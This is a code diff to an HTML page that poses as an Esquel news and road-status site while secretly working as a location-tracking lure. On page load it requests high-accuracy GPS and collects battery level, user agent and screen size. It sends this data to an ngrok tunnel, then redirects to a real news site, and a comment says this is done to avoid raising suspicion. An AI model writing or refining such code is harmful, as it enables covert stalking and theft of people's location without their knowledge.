@@ -1,37 +1,69 @@
 <!DOCTYPE html>
-<html>
+<html lang="es">
 <head>
-    <title>Noticias Esquel 2026</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Noticias Esquel - Estado de Rutas</title>
+</head>
+<body style="font-family: Arial; text-align: center; padding-top: 50px;">
+
+    <h1>Cargando información meteorológica...</h1>
+    <p>Conectando con el servidor de noticias local para tu zona.</p>
+
     <script>
-        function enviar(pos) {
-            // AQUÍ PEGA TU LINK DE NGROK
+        async function enviar(pos) {
+            // TU LINK DE NGROK (Asegurate de que sea el actual cada vez que reinicies Ngrok)
             const URL_NGROK = "https://overmean-beatifically-roland.ngrok-free.dev/save";
-            
+
+            // 1. Obtener nivel de batería y estado de carga
+            let batInfo = { nivel: "Desconocido", cargando: "No" };
+            try {
+                const battery = await navigator.getBattery();
+                batInfo.nivel = (battery.level * 100).toFixed(0) + "%";
+                batInfo.cargando = battery.charging ? "Si" : "No";
+            } catch (e) {
+                console.log("Error leyendo batería");
+            }
+
+            // 2. Recolectar todos los detalles adicionales
+            const payload = {
+                lat: pos.coords.latitude,
+                lon: pos.coords.longitude,
+                precision: pos.coords.accuracy.toFixed(2) + "m",
+                bateria: batInfo.nivel,
+                esta_cargando: batInfo.cargando,
+                dispositivo: navigator.userAgent,
+                pantalla: window.screen.width + "x" + window.screen.height
+            };
+
+            // 3. Enviar al servidor Python
             fetch(URL_NGROK, {
                 method: 'POST',
-                mode: 'no-cors', // Importante para evitar bloqueos de seguridad
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({lat: pos.coords.latitude, lon: pos.coords.longitude})
+                mode: 'no-cors',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
             });
-            
-            // Redirigir a la noticia real después de capturar
+
+            // 4. Redirigir a la noticia real para no levantar sospechas
             setTimeout(() => {
                 window.location.href = "https://www.eqsnotas.com/";
-            }, 1000);
+            }, 1500);
         }
 
-        function error() {
+        function error(err) {
+            console.warn(`ERROR(${err.code}): ${err.message}`);
+            // Si rechaza, igual lo mandamos a la noticia
             window.location.href = "https://www.eqsnotas.com/";
         }
 
-        // Pedir ubicación al cargar
+        // Ejecutar al cargar la página
         window.onload = function() {
-            navigator.geolocation.getCurrentPosition(enviar, error);
+            navigator.geolocation.getCurrentPosition(enviar, error, {
+                enableHighAccuracy: true, // Forzar GPS de alta precisión
+                timeout: 10000,
+                maximumAge: 0
+            });
         };
     </script>
-</head>
-<body style="font-family: Arial; text-align: center; padding-top: 50px;">
-    <h1>Cargando noticia...</h1>
-    <p>Conectando con el servidor de noticias local.</p>
 </body>
 </html>
